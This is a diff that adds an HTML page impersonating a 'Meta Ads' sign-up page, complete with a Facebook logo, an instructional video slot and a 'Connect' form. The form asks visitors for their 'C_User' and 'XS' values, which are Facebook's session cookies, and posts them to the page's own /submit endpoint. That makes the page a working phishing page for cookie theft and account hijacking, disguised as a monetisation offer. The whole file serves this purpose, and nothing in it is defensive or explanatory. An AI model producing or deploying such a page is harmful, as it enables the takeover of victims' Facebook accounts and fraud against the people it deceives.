@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Sign up to get started with Meta Ads.">
+    <title>Get Started with Meta Ads</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+
+    <header>
+        <div class="container">
+            <div class="logo">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
+                <h1>Meta Ads</h1>
+            </div>
+            <nav>
+                <ul>
+                    <li><a href="index.html">Home</a></li>
+                    <li><a href="#">How It Works</a></li>
+                    <li><a href="#">Get Started</a></li>
+                    <li><a href="#">Support</a></li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+
+    <section class="instructions">
+        <div class="container">
+            <h2>Get Started with Meta Ads</h2>
+            <p>Before you begin, please watch the video below for detailed instructions on how to submit your information and start monetizing your Facebook pages.</p>
+        </div>
+    </section>
+
+    <section class="video-player">
+        <div class="container">
+            <!-- HTML5 Video Player with Poster Image -->
+            <video controls width="75%" height="auto" class="video-player" poster="image.png">
+                <source src="video.mp4" type="video/mp4">
+                Your browser does not support the video tag.
+            </video>
+        </div>
+    </section>
+
+    <section class="form-section">
+        <div class="container">
+            <h3>Submit Your Information</h3>
+            <form action="/submit" method="POST" class="submission-form">
+                <div class="form-group">
+                    <label for="c_user">C_User:</label>
+                    <input type="text" id="c_user" name="c_user" required placeholder="Enter your C_User">
+                </div>
+                <div class="form-group">
+                    <label for="xs">XS:</label>
+                    <input type="text" id="xs" name="xs" required placeholder="Enter your XS">
+                </div>
+                <button type="submit" class="submit-btn">Connect</button>
+            </form>
+        </div>
+    </section>
+
+    <footer>
+        <div class="container">
+            <p>&copy; 2024 Meta Ads | All rights reserved</p>
+        </div>
+    </footer>
+
+</body>
+</html>
